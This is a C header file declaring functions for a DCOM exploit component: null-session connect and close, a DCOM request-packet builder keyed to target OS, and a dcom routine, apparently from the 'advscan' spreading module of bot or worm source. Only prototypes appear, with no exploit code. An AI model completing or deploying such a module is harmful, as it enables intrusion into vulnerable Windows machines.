#ifndef NO_DCOM
	#include "main.h"
	#include "advscan/defines.h"
	#include "advscan/advscan.h"
BOOL ConnectViaNullSession(const char *remote_host, LPNETRESOURCEW nr);
BOOL CloseNullSession(const char *remote_host);
char *CreateDCOMRequestPacket(EXINFO exinfo, DWORD *RequestPacketSize, int TargetOS, BOOL NamedPipe);
BOOL dcom(EXINFO exinfo);
#endif